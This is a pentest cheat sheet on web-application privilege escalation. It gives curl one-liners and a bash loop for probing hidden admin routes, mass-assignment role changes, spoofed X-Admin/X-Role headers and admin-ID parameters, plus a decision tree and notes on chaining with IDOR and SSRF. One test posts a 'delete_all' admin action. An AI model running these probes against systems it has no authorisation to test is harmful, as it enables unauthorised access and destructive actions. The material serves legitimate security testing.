# PRIVILEGE ESCALATION — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Hidden Admin Routes** | Admin paths in JS | `while read path; do curl -s -o /dev/null -w "%{http_code} %{size_download}" "/api/$path" -b "session=USER"; done < admin_paths.txt` | Admin page returns 200 with data | 403/401 → auth enforced |
| **Role in Body** | role/is_admin in response | `curl -X PUT /api/profile -d '{"role":"admin","is_admin":true}'` | Profile shows role=admin | Server ignores extra fields |
| **Role Header** | X-Admin / X-Role | `curl -X GET /api/admin/users -H "X-Admin: true" -b "session=USER"` | All users returned | Header ignored |
| **Admin via ID** | admin_id in request | `curl -X POST /api/action -d '{"admin_id":1,"action":"delete_all"}'` | Action performed | admin_id validated against session |
| **Function Parameter** | Same function user/admin | `curl /api/users?admin=true` vs `curl /api/users?admin=false` | More data with admin=true | Parameter validated server-side |

## CURL COMMANDS
```bash
# Find admin routes from JS
grep -oP '"/api/admin/[^"]+"' target.js | sort -u > admin_paths.txt
grep -oP '"/admin/[^"]+"' target.js | sort -u >> admin_paths.txt

# Test each with user session
while IFS= read -r path; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$path" -b "session=USER")
  size=$(curl -s -o admin_resp.txt -w "%{size_download}" "$path" -b "session=USER")
  echo "$path → $code ($size bytes)"
  [ "$size" -gt 100 ] && echo "  DATA LEAK! Check admin_resp.txt"
done < admin_paths.txt

# Role escalation via mass assignment
curl -v -X PATCH /api/user/profile -H "Cookie: A" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","is_admin":true,"permissions":["*"]}'

# Role header attack
for header in "X-Admin: true" "X-Role: admin" "X-Permissions: *" "is_admin: 1"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" /api/admin/users \
    -H "$header" -b "session=USER")
  echo "$header → $code"
done
```

## DECISION TREE
```
Found admin functionality?
├─ Can access admin URL directly with user session?
│  ├─ 200 + data → MISSING AUTH
│  └─ 403 → auth enforced
├─ Can add role/is_admin to request body?
│  ├─ Role changes → MASS ASSIGNMENT PRIVESC
│  └─ Role stays → whitelist
├─ Can add X-Admin/X-Role header?
│  ├─ 200 → HEADER-BASED PRIVESC
│  └─ Same response → header ignored
└─ Admin routes visible in client JS?
   ├─ Routes exist → RECON OPPORTUNITY (test each)
   └─ No routes → server-rendered admin
```

## CHAIN
PrivEsc + IDOR = Access and modify any resource
PrivEsc + SSRF = Internal network access from admin context
